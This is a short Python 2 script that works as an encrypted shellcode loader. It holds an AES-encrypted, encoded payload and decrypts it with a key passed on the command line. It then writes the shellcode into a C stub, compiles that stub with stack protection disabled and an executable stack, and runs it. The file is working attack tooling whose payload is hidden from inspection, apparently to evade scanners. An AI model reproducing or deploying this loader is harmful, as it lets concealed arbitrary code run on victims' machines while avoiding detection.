#!/usr/bin/env python

import base64, hashlib, os, sys
from Crypto import Random
from Crypto.Cipher import AES

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[0:-ord(s[-1])]

#aes encrypted, base64 encoded hex shellcode without \x chars
encryptedShellCode=\
"65664c3873703568736d573832736168684f35796a6d67696f2f70463552467762754b5a74527745555a64554d7841484b5359376b472b58482f41767370774734484f6e4d514a4d63795863674a72787951634557542b5841634435654258434d316744444963464b554e50656656766a615a396b7968664e304358695057636267377a556c78586856456862575165517259776771744f63676a39576e714d714a4e30796d544c6759486a6d75316738564e566f59793747346646694a5451414d4958426c3746493175736f56784c354e3845346f317634745674483772496d4b2b39635a71577a306a775543593555626c6274516972523767634b2b4c4f384b716373764845616b4a62494d326f74453261635a2b67386967465851324a795672546c35414676755434783652644f45313378535974496f4c6a6d7a64526148652f5a314e51627475477a65704d4b3857335738374170743142636b6d4f6545494d6e627938574d43784337684c736b76693755424a32572b535868514850496462717879703665683339363875387243714a796f495632392b384a613044667a464d4974616267337433464630545367466c7277593250675a493731692b62344e4f792f504c335a6b6935654a4b6b647a45495171434248744a5968303334775a6c457074624c5067726867536f534a624d77544f4c6f337170366c4b30422f4b716337626857624a416e446f33464f7555513d3d"

class AESCipher:
    def __init__(self, key):
        #key
        self.key = hashlib.sha256(key.encode('utf-8')).digest()

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(enc[16:]))


key = str(sys.argv[1])
cipher = AESCipher(key)
decrypted = encryptedShellCode.decode('hex')
decrypted = cipher.decrypt(decrypted)
#print decrypted

#write to file and exec shellcode
f = open('shellcode_py.c','w')
f.write('#include <stdio.h>')
f.write('\n' + '#include <string.h>')
f.write('\n' + 'unsigned char code [] = '+ '\"' + decrypted + '\";')
f.write('\n' + 'main()\n{'+ 'int (*ret)() = (int(*)())code;\nret();\n}')
f.close()
os.system("gcc -fno-stack-protector -z execstack shellcode_py.c -o shellcode_py")
os.system("./shellcode_py")
